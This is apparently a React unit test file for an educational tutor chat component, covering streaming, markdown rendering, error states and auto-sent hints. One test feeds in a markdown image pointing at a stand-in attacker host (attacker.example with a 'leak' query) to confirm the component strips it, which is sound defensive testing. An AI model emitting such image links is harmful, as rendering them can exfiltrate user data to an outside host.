// Unit test: TutorChat streams incremental deltas into the current
// tutor bubble and maps each rejection response to its own error state
// (spec 012 FR-005/FR-013/FR-015, T027).

import { render, screen, waitFor } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { beforeEach, describe, expect, it, vi } from "vitest";
import TutorChat from "@/components/TutorChat";
import * as api from "@/services/api";
import { ApiError } from "@/services/api";

vi.mock("@/services/api", async () => {
  const actual = await vi.importActual<typeof import("@/services/api")>("@/services/api");
  return {
    ...actual,
    streamTutorMessage: vi.fn(),
    getTutorExchange: vi.fn(),
  };
});

describe("TutorChat", () => {
  beforeEach(() => {
    vi.mocked(api.streamTutorMessage).mockReset();
    vi.mocked(api.getTutorExchange).mockReset();
    vi.mocked(api.getTutorExchange).mockResolvedValue({
      exchange_id: "unused",
      status: "completed",
      question_text: "unused",
      answer_text: "unused",
      grounded: false,
      retrieved_passages: [],
    });
  });

  it("renders the learner's question and streams deltas into the tutor bubble", async () => {
    vi.mocked(api.streamTutorMessage).mockImplementation(async (_sessionId, _question, onEvent) => {
      onEvent({ delta: "Light " });
      onEvent({ delta: "provides the energy." });
      onEvent({ done: true, exchange_id: "ex-1" });
    });

    render(<TutorChat sessionId="session-1" />);
    await userEvent.type(screen.getByPlaceholderText(/ask about this topic/i), "why does it need light?");
    await userEvent.click(screen.getByRole("button", { name: /send/i }));

    expect(api.streamTutorMessage).toHaveBeenCalledWith(
      "session-1",
      "why does it need light?",
      expect.any(Function),
    );
    expect(screen.getByTestId("tutor-chat-learner-message")).toHaveTextContent(
      "why does it need light?",
    );
    await waitFor(() =>
      expect(screen.getByTestId("tutor-chat-tutor-message")).toHaveTextContent(
        "Light provides the energy.",
      ),
    );
  });

  it("fetches and renders grounding sources once an exchange completes, and reports them upward", async () => {
    vi.mocked(api.streamTutorMessage).mockImplementation(async (_sessionId, _question, onEvent) => {
      onEvent({ delta: "x = 3." });
      onEvent({ done: true, exchange_id: "ex-grounded" });
    });
    vi.mocked(api.getTutorExchange).mockResolvedValue({
      exchange_id: "ex-grounded",
      status: "completed",
      question_text: "why is x = 3?",
      answer_text: "x = 3.",
      grounded: true,
      retrieved_passages: [
        { passage_id: "p1", topic_id: "multi-step-equations", field: "skill_summary", text: "..." },
      ],
    });
    const onSourcesChange = vi.fn();

    render(<TutorChat sessionId="session-1" onSourcesChange={onSourcesChange} />);
    await userEvent.type(screen.getByPlaceholderText(/ask about this topic/i), "why is x = 3?");
    await userEvent.click(screen.getByRole("button", { name: /send/i }));

    await waitFor(() => expect(screen.getByTestId("tutor-grounded-in")).toBeInTheDocument());
    expect(screen.getByTestId("tutor-grounded-in")).toHaveTextContent(
      "Multi Step Equations · skill summary",
    );
    await waitFor(() =>
      expect(onSourcesChange).toHaveBeenLastCalledWith([
        { passage_id: "p1", topic_id: "multi-step-equations", field: "skill_summary", text: "..." },
      ]),
    );
  });

  it("renders markdown in the tutor's answer instead of literal syntax", async () => {
    vi.mocked(api.streamTutorMessage).mockImplementation(async (_sessionId, _question, onEvent) => {
      onEvent({ delta: "Key points:\n\n- **Photosynthesis** needs light\n- It produces oxygen" });
      onEvent({ done: true, exchange_id: "ex-2" });
    });

    render(<TutorChat sessionId="session-1" />);
    await userEvent.type(screen.getByPlaceholderText(/ask about this topic/i), "how does it work?");
    await userEvent.click(screen.getByRole("button", { name: /send/i }));

    const tutorMessage = await screen.findByTestId("tutor-chat-tutor-message");
    await waitFor(() => expect(tutorMessage.querySelector("ul")).not.toBeNull());
    expect(tutorMessage.querySelector("strong")).toHaveTextContent("Photosynthesis");
    expect(tutorMessage.querySelectorAll("li")).toHaveLength(2);
  });

  it("strips markdown images from the tutor's answer instead of rendering them", async () => {
    vi.mocked(api.streamTutorMessage).mockImplementation(async (_sessionId, _question, onEvent) => {
      onEvent({ delta: "See this: ![diagram](https://attacker.example/x?d=leak)" });
      onEvent({ done: true, exchange_id: "ex-3" });
    });

    render(<TutorChat sessionId="session-1" />);
    await userEvent.type(screen.getByPlaceholderText(/ask about this topic/i), "show me a diagram");
    await userEvent.click(screen.getByRole("button", { name: /send/i }));

    const tutorMessage = await screen.findByTestId("tutor-chat-tutor-message");
    await waitFor(() => expect(tutorMessage).toHaveTextContent("See this:"));
    expect(tutorMessage.querySelector("img")).toBeNull();
  });

  it("disables the input and submit button while a stream is in flight", async () => {
    let resolveStream: () => void = () => {};
    vi.mocked(api.streamTutorMessage).mockImplementation(
      () =>
        new Promise<void>((resolve) => {
          resolveStream = resolve;
        }),
    );

    render(<TutorChat sessionId="session-1" />);
    const input = screen.getByPlaceholderText(/ask about this topic/i);
    await userEvent.type(input, "a question");
    await userEvent.click(screen.getByRole("button", { name: /send/i }));

    expect(input).toBeDisabled();
    expect(screen.getByTestId("loading-indicator")).toBeInTheDocument();
    expect(screen.getByRole("button", { name: /thinking/i })).toBeDisabled();

    resolveStream();
    await waitFor(() => expect(input).not.toBeDisabled());
  });

  it("shows a distinct message per rejection response and drops the empty tutor bubble", async () => {
    vi.mocked(api.streamTutorMessage).mockRejectedValue(
      new ApiError(429, "rate limited", { error: "rate_limited", retry_after_seconds: 42 }),
    );

    render(<TutorChat sessionId="session-1" />);
    await userEvent.type(screen.getByPlaceholderText(/ask about this topic/i), "a question");
    await userEvent.click(screen.getByRole("button", { name: /send/i }));

    await waitFor(() => expect(screen.getByTestId("tutor-error-rate-limited")).toBeInTheDocument());
    expect(screen.queryByTestId("tutor-chat-tutor-message")).not.toBeInTheDocument();
    expect(screen.getByTestId("tutor-chat-learner-message")).toBeInTheDocument();
  });

  it("clears a still-answering error once a later question succeeds", async () => {
    vi.mocked(api.streamTutorMessage).mockRejectedValueOnce(
      new ApiError(409, "still answering", { error: "still_answering", exchange_id: "ex-1" }),
    );

    render(<TutorChat sessionId="session-1" />);
    const input = screen.getByPlaceholderText(/ask about this topic/i);
    await userEvent.type(input, "first question");
    await userEvent.click(screen.getByRole("button", { name: /send/i }));
    await waitFor(() =>
      expect(screen.getByTestId("tutor-error-still-answering")).toBeInTheDocument(),
    );

    vi.mocked(api.streamTutorMessage).mockImplementationOnce(
      async (_sessionId, _question, onEvent) => {
        onEvent({ delta: "an answer" });
        onEvent({ done: true, exchange_id: "ex-1" });
      },
    );
    await userEvent.type(input, "second question");
    await userEvent.click(screen.getByRole("button", { name: /send/i }));

    await waitFor(() =>
      expect(screen.queryByTestId("tutor-error-still-answering")).not.toBeInTheDocument(),
    );
  });

  // spec 044 FR-021/FR-022 (US4)
  it("words the suggested prompts around the current topic when provided, falling back to generic wording otherwise", async () => {
    const { rerender } = render(<TutorChat sessionId="session-1" />);
    expect(screen.getByRole("button", { name: "Give me a hint, not the answer" })).toBeInTheDocument();

    rerender(<TutorChat sessionId="session-1" currentTopicDisplayName="Linear Equations" />);
    expect(
      screen.getByRole("button", { name: "Give me a hint about Linear Equations, not the answer" }),
    ).toBeInTheDocument();
  });

  // spec 044 FR-015/FR-017 (US3): Practice's inline panel drives this
  // prop instead of the learner typing first.
  it("auto-sends an initial message once, and re-sends only when it changes", async () => {
    vi.mocked(api.streamTutorMessage).mockImplementation(async (_sessionId, _question, onEvent) => {
      onEvent({ delta: "a hint" });
      onEvent({ done: true, exchange_id: "ex-1" });
    });

    const { rerender } = render(
      <TutorChat sessionId="session-1" initialMessage="Hint about question 1" />,
    );

    await waitFor(() => expect(api.streamTutorMessage).toHaveBeenCalledTimes(1));
    expect(screen.getByTestId("tutor-chat-learner-message")).toHaveTextContent(
      "Hint about question 1",
    );

    // Same value again (e.g. re-opening the panel for the same question) --
    // no duplicate send.
    rerender(<TutorChat sessionId="session-1" initialMessage="Hint about question 1" />);
    await waitFor(() => expect(api.streamTutorMessage).toHaveBeenCalledTimes(1));

    // A new value (advancing to the next question) sends a fresh hint
    // into the same session.
    rerender(<TutorChat sessionId="session-1" initialMessage="Hint about question 2" />);
    await waitFor(() => expect(api.streamTutorMessage).toHaveBeenCalledTimes(2));
  });
});
